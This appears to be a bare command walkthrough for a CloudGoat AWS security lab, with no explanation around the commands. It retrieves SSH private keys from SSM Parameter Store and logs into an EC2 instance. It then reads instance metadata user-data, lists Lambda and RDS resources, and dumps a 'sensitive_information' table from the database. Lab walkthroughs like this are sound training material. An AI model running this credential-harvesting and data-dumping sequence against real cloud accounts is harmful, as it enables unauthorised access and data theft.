`aws ssm describe-parameters --profile solo`

`aws ssm get-parameter --name <private key name> --profile solo`

`echo -e "<private key>" > ec2_ssh_key`

`chmod 400 ec2_ssh_key`

`aws ssm get-parameter --name <public key name> --profile solo`

`echo -e "<public key>" > ec2_ssh_key.pub`

`aws ec2 describe-instances --profile solo`

`ssh -i ec2_ssh_key ubuntu@<instance ip>`

# BRANCH A:

`sudo apt update && sudo apt install awscli -y`

`aws lambda list-functions --region us-east-1`

`aws rds describe-db-instances --profile solo`

# BRANCH B:

`curl http://169.254.169.254/latest/user-data`

`psql -h <rds db host/ip> -U cgadmin -d cloudgoat`

`\d`

`select * from sensitive_information;`